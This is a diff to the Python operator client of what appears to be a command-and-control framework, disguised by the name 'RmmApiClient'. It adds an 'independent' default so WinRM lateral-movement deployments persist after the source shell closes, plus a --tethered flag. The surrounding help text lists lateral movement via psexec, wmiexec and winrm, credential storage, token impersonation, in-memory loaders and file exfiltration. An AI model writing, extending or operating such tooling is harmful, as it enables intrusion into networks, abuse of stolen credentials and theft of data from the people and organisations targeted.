@@ -240,6 +240,7 @@ class RmmApiClient:
         https: bool = False,
         insecure: bool = False,
         loader: str = "csharp",
+        independent: bool = True,
     ):
         if not isinstance(https, bool) or (https and method.strip().lower() != "winrm"):
             raise ValueError("https must be a boolean and is supported only for winrm")
@@ -247,6 +248,12 @@ class RmmApiClient:
             raise ValueError("insecure must be a boolean and requires WinRM HTTPS")
         if not isinstance(loader, str) or (loader or "").strip().lower() not in ("csharp", "powershell"):
             raise ValueError("loader must be csharp or the reserved powershell value")
+        if not isinstance(independent, bool):
+            raise ValueError("independent must be a boolean")
+        if method.strip().lower() != "winrm":
+            # Independent lifetime is a winrm-scoped option and is ignored
+            # for the other methods, matching the server-side normalization.
+            independent = False
         return self.request(
             "POST",
             f"/api/v1/sessions/{session_id}/lateral",
@@ -258,6 +265,7 @@ class RmmApiClient:
                 "register_timeout": register_timeout,
                 "verify_timeout": verify_timeout,
                 "loader": (loader or "csharp").strip().lower(),
+                **({"independent": independent} if method.strip().lower() == "winrm" else {}),
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
             },
@@ -1236,7 +1244,12 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         die("HTTPS is supported only for winrm", 1)
     if getattr(args, "insecure", False) and not getattr(args, "https", False):
         die("--insecure requires --https", 1)
+    if getattr(args, "tethered", False) and args.method != "winrm":
+        die("--tethered is supported only for winrm", 1)
     say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
+    # WinRM deployments are independent by default; --tethered restores the
+    # held-shell lifetime. Independent is winrm-scoped and omitted elsewhere.
+    independent = args.method == "winrm" and not getattr(args, "tethered", False)
     code, data = client.lateral_move(
         sid,
         args.method,
@@ -1246,6 +1259,7 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         register_timeout=args.register_timeout,
         verify_timeout=args.verify_timeout,
         loader=getattr(args, "loader", "csharp"),
+        **({"independent": independent} if args.method == "winrm" else {}),
         **({"https": True} if getattr(args, "https", False) else {}),
         **({"insecure": True} if getattr(args, "insecure", False) else {}),
     )
@@ -1705,7 +1719,7 @@ Spawn:    /spawn [id]   (same identity; children inherit the source build mode)
           /runas -i <cred_id> <command>   (run command under different identity)
 Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del -i <cred_id> | /creds purge
 Identity: /make_token -i <cred_id> | /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
-Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure] [-l|--loader csharp|powershell]   (HTTPS/5986 for winrm only; wmiexec/winrm deploy in memory via the csharp loader; powershell is reserved)
+Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure] [-l|--loader csharp|powershell] [--tethered]   (HTTPS/5986 for winrm only; wmiexec/winrm deploy in memory via the csharp loader; winrm is independent by default — --tethered keeps the deployment alive only as long as the source holds its shell; powershell is reserved)
           -k requires -s and skips CA/name/revocation checks; certificate dates still apply.
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
 Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
@@ -2293,15 +2307,18 @@ def run_interactive(
                     index += 1
                 flags = [arg for arg in rest_args if arg in ("-s", "--https")]
                 insecure_flags = [arg for arg in rest_args if arg in ("-k", "--insecure")]
-                targets = [arg for arg in rest_args if arg not in ("-s", "--https", "-k", "--insecure")]
+                tethered_flags = [arg for arg in rest_args if arg == "--tethered"]
+                plain_args = [arg for arg in rest_args if arg not in ("-s", "--https", "-k", "--insecure", "--tethered", "--independent")]
+                targets = plain_args
                 if (method not in ("psexec", "wmiexec", "winrm") or
                         len(targets) != 1 or len(flags) > 1 or len(insecure_flags) > 1 or
                         (insecure_flags and not flags) or
                         any(arg.startswith("-") for arg in targets) or
                         (flags and method != "winrm") or
+                        (tethered_flags and method != "winrm") or
                         len(loader_values) > 1 or
                         any(value not in ("csharp", "powershell") for value in loader_values)):
-                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)] [-l|--loader csharp|powershell]")
+                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)] [-l|--loader csharp|powershell] [--tethered (winrm only; independent is the default)]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -2309,9 +2326,13 @@ def run_interactive(
                     continue
                 host = targets[0]
                 say(f"Lateral {method} to {host} (waits for the next beacon)...")
+                # WinRM deployments are independent by default; --tethered
+                # restores the held-shell lifetime.
+                independent = method == "winrm" and not tethered_flags
                 code, data = client.lateral_move(
                     sid, method, host,
                     **({"loader": loader_values[0]} if loader_values else {}),
+                    **({"independent": independent} if method == "winrm" else {}),
                     **({"https": True} if flags else {}),
                     **({"insecure": True} if insecure_flags else {}))
                 if code != 200:
@@ -2975,6 +2996,10 @@ def build_parser() -> argparse.ArgumentParser:
     sp_lat.add_argument("-k", "--insecure", action="store_true", help="Skip CA/name/revocation checks; certificate dates still apply (requires --https)")
     sp_lat.add_argument("-l", "--loader", choices=("csharp", "powershell"), default="csharp",
                         help="Loader implementation for the wmiexec/winrm in-memory deployment; powershell is reserved and fails explicitly")
+    sp_lat.add_argument("--independent", action="store_true", default=False,
+                        help="No-op compatibility flag: winrm loader deployments are independent by default")
+    sp_lat.add_argument("--tethered", action="store_true",
+                        help="WinRM only: keep the classic tethered lifetime, where the source holds the shell open and the deployment dies with it")
     sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
     sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
     sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
